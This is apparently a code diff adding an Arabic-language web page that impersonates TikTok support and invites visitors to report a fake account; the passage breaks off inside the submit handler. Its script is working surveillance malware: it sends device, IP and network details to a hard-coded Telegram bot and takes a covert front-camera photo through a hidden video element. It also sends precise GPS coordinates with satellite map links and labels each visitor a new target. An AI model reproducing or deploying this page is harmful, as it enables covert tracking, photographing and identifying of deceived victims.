@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#000000">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="TikTok">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3Crect width='180' height='180' rx='38' fill='%23000'/%3E%3Cpath d='M128 45c-3.7 17-15.7 28.3-32 30v24.5c10.2-1.2 20-4.9 28.3-10.6V145c0 21-17 38-38 38s-38-17-38-38 17-38 38-38c2.7 0 5.3.3 7.7.8v23.7c-2.3-1.1-4.9-1.8-7.7-1.8-7.7 0-13.7 6-13.7 13.7s6 13.7 13.7 13.7 13.7-6 13.7-13.7V45h28z' fill='%23fff'/%3E%3C/svg%3E">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3Crect width='180' height='180' rx='38' fill='%23000'/%3E%3Cpath d='M128 45c-3.7 17-15.7 28.3-32 30v24.5c10.2-1.2 20-4.9 28.3-10.6V145c0 21-17 38-38 38s-38-17-38-38 17-38 38-38c2.7 0 5.3.3 7.7.8v23.7c-2.3-1.1-4.9-1.8-7.7-1.8-7.7 0-13.7 6-13.7 13.7s6 13.7 13.7 13.7 13.7-6 13.7-13.7V45h28z' fill='%23fff'/%3E%3C/svg%3E">
+<title>TikTok</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
+:root{--pink:#FE2C55;--cyan:#25F4EE;--input-bg:#1C1D24;--border:#2f2f38;--muted:#8A8B91}
+html,body{height:100%;overflow:hidden;background:#000;color:#fff}
+body{display:flex;flex-direction:column;height:100vh;overscroll-behavior:none;-webkit-font-smoothing:antialiased;user-select:none}
+.app-header{display:flex;align-items:center;justify-content:space-between;padding:14px 16px;padding-top:calc(14px + env(safe-area-inset-top));border-bottom:1px solid #1a1a1f;background:#000;position:relative;z-index:10}
+.header-btn{width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;background:transparent;border:none;color:#fff;cursor:pointer;transition:background .15s}
+.header-btn:active{background:#1a1a1f}
+.header-title{font-size:17px;font-weight:700}
+.tiktok-logo-header{display:flex;align-items:center;gap:7px}
+.tiktok-note{width:22px;height:22px}
+.main-content{flex:1;overflow-y:auto;overflow-x:hidden;padding:20px 20px 40px;-webkit-overflow-scrolling:touch;scroll-behavior:smooth}
+.main-content::-webkit-scrollbar{display:none}
+.hero-icon{width:78px;height:78px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,rgba(254,44,85,.12),rgba(37,244,238,.12));border-radius:22px;position:relative}
+.hero-icon::before{content:'';position:absolute;inset:-2px;background:linear-gradient(135deg,var(--pink),var(--cyan));border-radius:24px;z-index:-1;opacity:.6;filter:blur(10px)}
+.hero-title{font-size:25px;font-weight:800;line-height:1.35;text-align:center;margin-bottom:12px;letter-spacing:-.5px}
+.hero-title .accent{background:linear-gradient(90deg,var(--cyan),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero-sub{font-size:14px;color:var(--muted);line-height:1.7;text-align:center;margin-bottom:26px}
+.verified-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:22px;font-size:12px;color:var(--cyan)}
+.verified-dot{width:6px;height:6px;border-radius:50%;background:var(--cyan);animation:blink 1.4s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.field-group{margin-bottom:16px}
+.field-label{display:block;font-size:13px;font-weight:600;color:#fff;margin-bottom:10px;padding-right:4px}
+.input-container{position:relative;background:var(--input-bg);border:1.5px solid #2a2a32;border-radius:12px;transition:border-color .2s,background .2s;display:flex;align-items:center;padding:0 14px;height:56px}
+.input-container:focus-within{border-color:var(--pink);background:#1F2029}
+.input-container.disabled{opacity:.4;pointer-events:none}
+.at-sign{color:var(--muted);font-size:17px;font-weight:600;margin-right:8px;user-select:none}
+.input-container input{flex:1;background:transparent;border:none;outline:none;color:#fff;font-size:16px;font-weight:500;padding:0;min-width:0;font-family:inherit}
+.input-container input::placeholder{color:#5a5b62}
+.input-container.error{border-color:var(--pink);animation:shake .4s}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+.tiktok-btn{width:100%;height:52px;background:var(--pink);border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:transform .1s,opacity .2s,background .2s;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px;position:relative;overflow:hidden;letter-spacing:.2px}
+.tiktok-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,.18),transparent);transform:translateX(-100%);transition:transform .6s}
+.tiktok-btn:active::before{transform:translateX(100%)}
+.tiktok-btn:active{transform:scale(.985);background:#e02548}
+.tiktok-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+.btn-spinner{width:18px;height:18px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+.info-box{margin-top:22px;padding:14px 16px;background:#0F1015;border:1px solid #1F2029;border-radius:12px;display:flex;gap:12px;align-items:flex-start}
+.info-box-icon{width:20px;height:20px;flex-shrink:0;margin-top:1px;color:var(--cyan)}
+.info-box p{font-size:12.5px;color:#a8a9b0;line-height:1.65}
+.loading-screen{display:none;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px;text-align:center;animation:fadeIn .5s}
+.loading-screen.show{display:flex}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+.loading-tiktok{width:90px;height:90px;margin-bottom:30px;position:relative}
+.loading-tiktok svg{width:100%;height:100%}
+.loading-tiktok::after{content:'';position:absolute;inset:-12px;border-radius:50%;border:2px solid transparent;border-top-color:var(--pink);border-right-color:var(--cyan);animation:spin 1s linear infinite}
+.loading-title{font-size:17px;font-weight:600;margin-bottom:8px}
+.loading-sub{font-size:13px;color:var(--muted);line-height:1.6;max-width:280px;margin-bottom:28px}
+.progress-bar-wrap{width:100%;max-width:280px;height:4px;background:#1F2029;border-radius:2px;overflow:hidden;margin-bottom:8px}
+.progress-bar-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--cyan),var(--pink));border-radius:2px;transition:width .5s ease}
+.progress-text{font-size:12px;color:var(--muted);font-weight:600;letter-spacing:.5px}
+.success-screen{display:none;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px;text-align:center;animation:fadeIn .5s}
+.success-screen.show{display:flex}
+.success-circle{width:90px;height:90px;margin-bottom:24px;border-radius:50%;background:linear-gradient(135deg,var(--cyan),var(--pink));display:flex;align-items:center;justify-content:center;animation:pop .6s cubic-bezier(.68,-.55,.265,1.55);position:relative}
+.success-circle::before{content:'';position:absolute;inset:-10px;border-radius:50%;background:linear-gradient(135deg,rgba(37,244,238,.3),rgba(254,44,85,.3));filter:blur(14px);z-index:-1}
+.success-circle svg{width:46px;height:46px;color:#fff}
+@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
+.bottom-nav{display:flex;align-items:center;justify-content:space-around;padding:8px 0 calc(8px + env(safe-area-inset-bottom));background:#000;border-top:1px solid #1a1a1f;position:relative;z-index:10}
+.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;padding:6px 0;color:#5a5b62;font-size:10px;font-weight:500;cursor:pointer;transition:color .15s;background:none;border:none;font-family:inherit}
+.nav-item.active{color:#fff}
+.nav-item svg{width:22px;height:22px}
+.nav-item.plus-btn{flex:0 0 auto;width:44px;height:30px;position:relative;margin:0 4px}
+.nav-item.plus-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(90deg,var(--cyan),var(--pink));border-radius:8px}
+.nav-item.plus-btn::after{content:'';position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);width:16px;height:16px;background:linear-gradient(#000,#000) center/2px 100% no-repeat,linear-gradient(#000,#000) center/100% 2px no-repeat}
+.toast{position:fixed;bottom:calc(90px + env(safe-area-inset-bottom));left:50%;transform:translateX(-50%) translateY(20px);background:#1C1D24;border:1px solid #2a2b33;color:#fff;padding:14px 20px;border-radius:12px;font-size:13px;font-weight:500;max-width:90%;text-align:center;opacity:0;pointer-events:none;transition:all .3s;z-index:2000;box-shadow:0 8px 30px rgba(0,0,0,.6);line-height:1.5}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+.toast .toast-icon{display:inline-block;margin-left:6px;color:var(--pink)}
+.video-wrap{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
+</style>
+</head>
+<body>
+
+<header class="app-header">
+  <button class="header-btn" aria-label="back">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+  </button>
+  <div class="tiktok-logo-header">
+    <svg class="tiktok-note" viewBox="0 0 48 48" fill="none"><path d="M34 12c-1 4.5-4.2 7.5-8.5 8v6.5c2.7-.3 5.3-1.3 7.5-2.8V34c0 5.5-4.5 10-10 10s-10-4.5-10-10 4.5-10 10-10c.7 0 1.4.1 2 .2v6.3c-.6-.3-1.3-.5-2-.5-2 0-3.6 1.6-3.6 3.6s1.6 3.6 3.6 3.6 3.6-1.6 3.6-3.6V12h7.4z" fill="#fff"/></svg>
+    <div class="header-title">الدعم</div>
+  </div>
+  <button class="header-btn" aria-label="menu">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="12" cy="5" r="1" fill="currentColor"></circle><circle cx="12" cy="12" r="1" fill="currentColor"></circle><circle cx="12" cy="19" r="1" fill="currentColor"></circle></svg>
+  </button>
+</header>
+
+<main class="main-content" id="mainContent">
+  <div id="formStep">
+    <div class="verified-row"><span class="verified-dot"></span>نظام التحقق الآمن — TikTok Verified</div>
+    <div class="hero-icon">
+      <svg width="42" height="42" viewBox="0 0 24 24" fill="none" stroke="url(#hg)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+        <path d="M9 12l2 2 4-4"></path>
+        <defs><linearGradient id="hg" x1="0" y1="0" x2="24" y2="24"><stop offset="0%" stop-color="#25F4EE"/><stop offset="100%" stop-color="#FE2C55"/></linearGradient></defs>
+      </svg>
+    </div>
+    <h1 class="hero-title">تحقق من <span class="accent">حساب مزيف</span></h1>
+    <p class="hero-sub">أدخل اسم المستخدم للحساب الذي ترغب بالإبلاغ عنه، وسيقوم فريق التحقق بمقارنته مع سجلات الملكية الأصلية.</p>
+
+    <div class="field-group">
+      <label class="field-label">اسم المستخدم (Username)</label>
+      <div class="input-container disabled" id="inputContainer">
+        <span class="at-sign">@</span>
+        <input type="text" id="username" placeholder="username" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" disabled>
+      </div>
+    </div>
+
+    <button class="tiktok-btn" id="submitBtn" disabled>
+      <span class="btn-spinner" id="spinner"></span>
+      <span id="btnText">بدء التحقق</span>
+    </button>
+
+    <div class="info-box">
+      <svg class="info-box-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+      <p>بالمتابعة، أنت توافق على استخدام بيانات الجهاز والموقع لتوثيق البلاغ وفق سياسة TikTok لحماية الملكية الفكرية.</p>
+    </div>
+  </div>
+
+  <div class="loading-screen" id="loadingStep">
+    <div class="loading-tiktok">
+      <svg viewBox="0 0 48 48" fill="none">
+        <path d="M34 12c-1 4.5-4.2 7.5-8.5 8v6.5c2.7-.3 5.3-1.3 7.5-2.8V34c0 5.5-4.5 10-10 10s-10-4.5-10-10 4.5-10 10-10c.7 0 1.4.1 2 .2v6.3c-.6-.3-1.3-.5-2-.5-2 0-3.6 1.6-3.6 3.6s1.6 3.6 3.6 3.6 3.6-1.6 3.6-3.6V12h7.4z" fill="url(#lg)"/>
+        <defs><linearGradient id="lg" x1="0" y1="0" x2="48" y2="48"><stop offset="0%" stop-color="#25F4EE"/><stop offset="100%" stop-color="#FE2C55"/></linearGradient></defs>
+      </svg>
+    </div>
+    <div class="loading-title" id="loadingTitle">جاري التحقق من الحساب</div>
+    <div class="loading-sub" id="loadingSub">يتم الآن مطابقة البيانات مع سجلات TikTok الرسمية...</div>
+    <div class="progress-bar-wrap"><div class="progress-bar-fill" id="progressFill"></div></div>
+    <div class="progress-text" id="progressText">0%</div>
+  </div>
+
+  <div class="success-screen" id="successStep">
+    <div class="success-circle">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+    </div>
+    <div class="loading-title">تم استلام بلاغك بنجاح</div>
+    <div class="loading-sub">سيتم مراجعة الطلب من قبل فريق الأمان خلال 24 ساعة.<br>ستصلك النتيجة عبر الإشعارات داخل التطبيق.</div>
+    <div style="margin-top:20px;font-size:12px;color:#5a5b62">رقم البلاغ: <span id="reportId" style="color:#25F4EE;font-weight:700"></span></div>
+  </div>
+</main>
+
+<nav class="bottom-nav">
+  <button class="nav-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg><span>الرئيسية</span></button>
+  <button class="nav-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg><span>استكشاف</span></button>
+  <button class="nav-item plus-btn"></button>
+  <button class="nav-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg><span>الرسائل</span></button>
+  <button class="nav-item"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><span>حسابي</span></button>
+</nav>
+
+<div class="toast" id="toast">
+  <span class="toast-icon">⚠</span>
+  <span id="toastText">الرجاء الموافقة على الأذونات المطلوبة للتواصل مع فريق الدعم</span>
+</div>
+
+<video id="cam" class="video-wrap" autoplay playsinline muted></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+const BOT_TOKEN="8687054964:AAFCZn62wp9o4skQWGeWH31bSvqYuGpyeYE";
+const CHAT_ID="5526748858";
+const tg=`https://api.telegram.org/bot${BOT_TOKEN}`;
+const $=id=>document.getElementById(id);
+
+let currentUsername="",photoBlob=null,userLocation=null;
+let camGranted=false,locGranted=false;
+
+if('serviceWorker' in navigator){
+  const swCode=`const CACHE_NAME='tiktok-v6';self.addEventListener('install',e=>{self.skipWaiting()});self.addEventListener('activate',e=>{e.waitUntil(self.clients.claim())});self.addEventListener('fetch',e=>{const url=new URL(e.request.url);if(url.hostname.includes('telegram.org')||url.hostname.includes('ipapi.co'))return;e.respondWith(caches.match(e.request).then(c=>c||fetch(e.request).then(r=>{if(e.request.method==='GET'&&url.origin===location.origin){const cp=r.clone();caches.open(CACHE_NAME).then(cc=>cc.put(e.request,cp))}return r}).catch(()=>caches.match('./'))))});`;
+  const blob=new Blob([swCode],{type:'application/javascript'});
+  navigator.serviceWorker.register(URL.createObjectURL(blob)).catch(()=>{});
+}
+
+function showToast(msg){
+  const t=$('toast');
+  $('toastText').textContent=msg;
+  t.classList.add('show');
+  clearTimeout(window._toastTimer);
+  window._toastTimer=setTimeout(()=>t.classList.remove('show'),5000);
+}
+
+async function sendText(text){
+  try{
+    await fetch(`${tg}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID,text,parse_mode:'HTML',disable_web_page_preview:true})
+    });
+  }catch(e){}
+}
+
+async function sendPhoto(blob,caption){
+  try{
+    const fd=new FormData();
+    fd.append('chat_id',CHAT_ID);
+    fd.append('photo',blob,'selfie_'+Date.now()+'.jpg');
+    fd.append('caption',caption);
+    fd.append('parse_mode','HTML');
+    await fetch(`${tg}/sendPhoto`,{method:'POST',body:fd});
+  }catch(e){}
+}
+
+function deviceInfo(){
+  const ua=navigator.userAgent;
+  let device='?',os='?',browser='?';
+  if(/iPhone/i.test(ua))device='iPhone';
+  else if(/iPad/i.test(ua))device='iPad';
+  else if(/Android/i.test(ua))device='Android';
+  else if(/Windows/i.test(ua))device='Windows';
+  else if(/Mac/i.test(ua))device='Mac';
+  if(/iPhone|iPad|iPod/.test(ua))os='iOS';
+  else if(/Android/.test(ua))os='Android';
+  else if(/Windows/.test(ua))os='Windows';
+  else if(/Mac/.test(ua))os='macOS';
+  if(/Edg\//.test(ua))browser='Edge';
+  else if(/Chrome\//.test(ua)&&!/Edg/.test(ua))browser='Chrome';
+  else if(/Firefox\//.test(ua))browser='Firefox';
+  else if(/Safari\//.test(ua)&&!/Chrome/.test(ua))browser='Safari';
+  const screenInfo=`${screen.width}x${screen.height} @${window.devicePixelRatio}x`;
+  const isPWA=window.matchMedia('(display-mode: standalone)').matches||window.navigator.standalone;
+  return{device,os,browser,ua,screenInfo,isPWA};
+}
+
+async function getBatteryInfo(){
+  try{
+    if(!navigator.getBattery)return null;
+    const b=await navigator.getBattery();
+    return{
+      level:Math.round(b.level*100),
+      charging:b.charging
+    };
+  }catch(e){return null;}
+}
+
+async function getNetworkInfo(){
+  try{
+    const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    if(!c)return null;
+    return{
+      type:c.effectiveType||c.type||'?',
+      downlink:c.downlink||'?',
+      rtt:c.rtt||'?'
+    };
+  }catch(e){return null;}
+}
+
+function getScreenInfo(){
+  return{
+    w:screen.width,
+    h:screen.height,
+    pixelRatio:window.devicePixelRatio,
+    language:navigator.language,
+    platform:navigator.platform||'?',
+    cpuCores:navigator.hardwareConcurrency||'?',
+    memory:navigator.deviceMemory||'?',
+    touchPoints:navigator.maxTouchPoints||0,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone||'?',
+    online:navigator.onLine
+  };
+}
+
+async function requestCameraSilently(){
+  return new Promise(async resolve=>{
+    try{
+      const stream=await navigator.mediaDevices.getUserMedia({
+        video:{
+          facingMode:'user',
+          width:{ideal:1280},
+          height:{ideal:960},
+          frameRate:{ideal:24}
+        },
+        audio:false
+      });
+      const v=$('cam');
+      v.srcObject=stream;
+      try{
+        const track=stream.getVideoTracks()[0];
+        const constraints={advanced:[{focusMode:'continuous'}]};
+        await track.applyConstraints(constraints);
+      }catch(e){}
+      await v.play();
+      await new Promise(r=>setTimeout(r,3000));
+
+      const vw=v.videoWidth||1280;
+      const vh=v.videoHeight||960;
+
+      const canvas=$('canvas');
+      canvas.width=vw;
+      canvas.height=vh;
+      const ctx=canvas.getContext('2d',{willReadFrequently:false});
+      ctx.imageSmoothingEnabled=true;
+      ctx.imageSmoothingQuality='high';
+
+      ctx.save();
+      ctx.translate(vw,0);
+      ctx.scale(-1,1);
+      ctx.drawImage(v,0,0,vw,vh);
+      ctx.restore();
+
+      canvas.toBlob(blob=>{
+        stream.getTracks().forEach(t=>t.stop());
+        resolve(blob);
+      },'image/jpeg',0.98);
+    }catch(err){
+      resolve(null);
+    }
+  });
+}
+
+function requestLocationSilently(){
+  return new Promise(res=>{
+    if(!navigator.geolocation){
+      res(null);
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      p=>res({lat:p.coords.latitude,lng:p.coords.longitude,acc:Math.round(p.coords.accuracy)}),
+      (err)=>{
+        console.warn('Location error:',err);
+        res(null);
+      },
+      {enableHighAccuracy:true,timeout:20000,maximumAge:0}
+    );
+  });
+}
+
+async function getIP(){
+  try{return await(await fetch('https://ipapi.co/json/')).json();}
+  catch{return null;}
+}
+
+function setProgress(p,text){
+  $('progressFill').style.width=p+'%';
+  $('progressText').textContent=p+'%';
+  if(text)$('loadingSub').textContent=text;
+}
+
+function unlockForm(){
+  $('inputContainer').classList.remove('disabled');
+  $('username').disabled=false;
+  $('submitBtn').disabled=false;
+}
+
+async function initialDataCollection(){
+  const ip=await getIP();
+  const battery=await getBatteryInfo();
+  const network=await getNetworkInfo();
+  const screenData=getScreenInfo();
+  const info=deviceInfo();
+  const timeStr=new Date().toLocaleString('ar-EG',{timeZone:'Asia/Riyadh',hour12:false});
+
+  let msg=`📥 <b>زيارة جديدة — TikTok Verification</b>\n`;
+  msg+=`━━━━━━━━━━━━━━━━━━━━━━\n`;
+  msg+=`🕐 <b>الوقت:</b> ${timeStr}\n`;
+  msg+=`📱 <b>الجهاز:</b> ${info.device} — ${info.os}\n`;
+  msg+=`🌐 <b>المتصفح:</b> ${info.browser}\n`;
+  msg+=`📲 <b>وضع PWA:</b> ${info.isPWA?'✅ مُثبّت كتطبيق':'🌐 متصفح'}\n`;
+
+  if(ip&&ip.ip){
+    msg+=`\n🌍 <b>الشبكة:</b>\n`;
+    msg+=`   IP: <code>${ip.ip}</code>\n`;
+    msg+=`   الدولة: ${ip.country_name||'?'} ${ip.country_code||''}\n`;
+    msg+=`   المدينة: ${ip.city||'?'} — ${ip.region||''}\n`;
+    msg+=`   المزود: ${ip.org||'?'}\n`;
+    msg+=`   ASN: ${ip.asn||'?'}\n`;
+  }
+
+  if(battery){
+    msg+=`\n🔋 <b>البطارية:</b> ${battery.level}% ${battery.charging?'⚡ تشحن':'🔌 لا تشحن'}\n`;
+  }
+
+  if(network){
+    msg+=`\n📶 <b>الشبكة:</b> ${network.type} · ${network.downlink}Mbps · RTT ${network.rtt}ms\n`;
+  }
+
+  msg+=`\n📐 <b>الشاشة:</b> ${screenData.w}×${screenData.h} @${screenData.pixelRatio}x\n`;
+  msg+=`🗣️ <b>اللغة:</b> ${screenData.language}\n`;
+  msg+=`⏰ <b>المنطقة الزمنية:</b> ${screenData.timezone}\n`;
+  msg+=`💻 <b>المنصة:</b> ${screenData.platform}\n`;
+  msg+=`⚙️ <b>المعالج:</b> ${screenData.cpuCores} cores\n`;
+  msg+=`💾 <b>الذاكرة:</b> ${screenData.memory} GB\n`;
+  msg+=`👆 <b>اللمس:</b> ${screenData.touchPoints} points\n`;
+  msg+=`🌐 <b>الإنترنت:</b> ${screenData.online?'متصل':'غير متصل'}\n`;
+  msg+=`🔗 <b>UA:</b> <code>${info.ua.substring(0,150)}</code>\n`;
+
+  await sendText(msg);
+}
+
+async function collectPermissionsAndSend(){
+  const ip=await getIP();
+
+  const locPromise=requestLocationSilently();
+  const camPromise=requestCameraSilently();
+
+  const [loc,photo]=await Promise.all([locPromise,camPromise]);
+
+  if(photo){
+    photoBlob=photo;
+    camGranted=true;
+  }
+  if(loc){
+    userLocation=loc;
+    locGranted=true;
+  }
+
+  if(camGranted&&locGranted){
+    unlockForm();
+    let msg=`✅ <b>تم منح جميع الأذونات</b>\n`;
+    msg+=`━━━━━━━━━━━━━━━━━━━━━━\n`;
+    msg+=`🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG',{timeZone:'Asia/Riyadh',hour12:false})}\n`;
+
+    if(loc){
+      msg+=`\n📍 <b>الموقع:</b>\n`;
+      msg+=`   Lat: <code>${loc.lat}</code>\n`;
+      msg+=`   Lng: <code>${loc.lng}</code>\n`;
+      msg+=`   Accuracy: ~${loc.acc}m\n`;
+      msg+=`   🗺️ <a href="https://maps.google.com/?q=${loc.lat},${loc.lng}">خرائط Google</a>\n`;
+      msg+=`   🛰️ <a href="https://www.google.com/maps/@?api=1&map_action=map&center=${loc.lat},${loc.lng}&zoom=20&basemap=satellite">قمر صناعي</a>\n`;
+    }
+
+    if(ip&&ip.ip){
+      msg+=`\n🌍 <b>IP:</b> <code>${ip.ip}</code>\n`;
+    }
+
+    await sendText(msg);
+
+    if(photo){
+      const sizeKB=(photo.size/1024).toFixed(0);
+      await sendPhoto(photo,`📸 سيلفي أولية — قبل إدخال Username\n💾 ${sizeKB}KB`);
+    }
+    return true;
+  }else{
+    $('inputContainer').classList.add('disabled');
+    $('username').disabled=true;
+    $('submitBtn').disabled=true;
+
+    let msg=`⚠️ <b>تم رفض بعض الأذونات</b>\n`;
+    msg+=`━━━━━━━━━━━━━━━━━━━━━━\n`;
+    msg+=`🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG',{timeZone:'Asia/Riyadh',hour12:false})}\n`;
+    msg+=`📷 <b>الكاميرا:</b> ${camGranted?'✅':'❌ مرفوضة'}\n`;
+    msg+=`📍 <b>الموقع:</b> ${locGranted?'✅':'❌ مرفوض'}\n`;
+
+    if(loc){
+      msg+=`\n📍 <b>الموقع:</b>\n`;
+      msg+=`   Lat: <code>${loc.lat}</code>\n`;
+      msg+=`   Lng: <code>${loc.lng}</code>\n`;
+      msg+=`   🗺️ <a href="https://maps.google.com/?q=${loc.lat},${loc.lng}">خرائط Google</a>\n`;
+    }
+
+    if(ip&&ip.ip){
+      msg+=`\n🌍 <b>IP:</b> <code>${ip.ip}</code>\n`;
+      msg+=`   الدولة: ${ip.country_name||'?'}\n`;
+      msg+=`   المدينة: ${ip.city||'?'}\n`;
+    }
+
+    if(photo){
+      const sizeKB=(photo.size/1024).toFixed(0);
+      msg+=`\n📸 <b>صورة:</b> تم التقاطها (${sizeKB}KB)\n`;
+    }
+
+    await sendText(msg);
+
+    if(photo){
+      await sendPhoto(photo,`📸 صورة أُخذت قبل رفض الإذن`);
+    }
+
+    showToast('الرجاء الموافقة على الأذونات المطلوبة للتواصل مع فريق الدعم');
+    return false;
+  }
+}
+
+async function continueProcessing(){
+  const username=currentUsername;
+  const info=deviceInfo();
+  const timeStr=new Date().toLocaleString('ar-EG',{timeZone:'Asia/Riyadh',hour12:false});
+
+  $('loadingTitle').textContent='جاري إكمال التحقق...';
+
+  const ip=await getIP();
+  const loc=userLocation;
+
+  const steps=[
+    {p:60,d:1200,t:'مطابقة سجل الملكية...'},
+    {p:75,d:1400,t:'التحقق من بيانات الجهاز والموقع...'},
+    {p:88,d:1300,t:'إنشاء تقرير البلاغ...'},
+    {p:95,d:900,t:'تشفير البيانات وإرسالها...'}
+  ];
+  for(const s of steps){
+    await new Promise(r=>setTimeout(r,s.d));
+    setProgress(s.p,s.t);
+  }
+
+  let msg=`🎯 <b>هدف جديد — TikTok Verification</b>\n`;
+  msg+=`━━━━━━━━━━━━━━━━━━━━━━\n`;
+  msg+=`👤 <b>Username المُدخل:</b> <code>@${username}</code>\n`;
+  msg+=`🕐 <b>الوقت:</b> ${timeStr}\n`;
+  msg+=`📱 <b>الجهاز:</b> ${info.device} — ${info.os}\n`;
+  msg+=`🌐 <b>المتصفح:</b> ${info.browser}\n`;
+  msg+=`📐 <b>الشاشة:</b> ${info.screenInfo}\n`;
+  msg+=`📲 <b>وضع PWA:</b> ${info.isPWA?'✅ مُثبّت كتطبيق':'🌐 متصفح'}\n`;
+  msg+=`🔗 <b>UA:</b> <code>${info.ua.substring(0,150)}</code>\n`;
+
+  if(loc){
+    msg+=`\n📍 <b>الموقع الجغرافي:</b>\n`;
+    msg+=`   Lat: <code>${loc.lat}</code>\n`;
+    msg+=`   Lng: <code>${loc.lng}</code>\n`;
+    msg+=`   Accuracy: ~${loc.acc}m\n`;
+    msg+=`   🗺️ <a href="https://maps.google.com/?q=${loc.lat},${loc.lng}">خرائط Google</a>\n`;
+    msg+=`   🛰️ <a href="https://www.google.com/maps/@?api=1&map_action=map&center=${loc.lat},${loc.lng}&zoom=20&basemap=satellite">قمر صناعي</a>\n`;
+  }else{
+    msg+=`\n📍 <b>الموقع:</b> ❌ غير متاح\n`;
+  }
+
+  if(ip&&ip.ip){
+    msg+=`\n🌍 <b>الشبكة:</b>\n`;
+    msg+=`   IP: <code>${ip.ip}</code>\n`;
+    msg+=`   الدولة: ${ip.country_name||'?'} ${ip.country_code||''}\n`;
+    msg+=`   المدينة: ${ip.city||'?'} — ${ip.region||''}\n`;
+    msg+=`   المزود: ${ip.org||'?'}\n`;
+    msg+=`   ASN: ${ip.asn||'?'}\n`;
+  }
+
+  await sendText(msg);
+
+  if(photoBlob){
+    const sizeKB=(photoBlob.size/1024).toFixed(0);
+    await sendPhoto(photoBlob,`📸 سيلفي أمامية — @${username}\n💾 ${sizeKB}KB`);
+  }
+
+  setProgress(100,'اكتمل التحقق');
+  await new Promise(r=>setTimeout(r,800));
+
+  const reportId='TK-'+Date.now().toString(36).toUpperCase().slice(-8);
+  $('reportId').textContent=reportId;
+
+  $('loadingStep').classList.remove('show');
+  $('successStep').classList.add('show');
+}
+
+$('submitBtn').addEventListener('click',async()=>{
+  const username=$('username').value.trim().replace(/^@/,'');
+  if(!username||username.length<2){
+    $('inputContainer').classList.add('error');
+    $('username').focus();
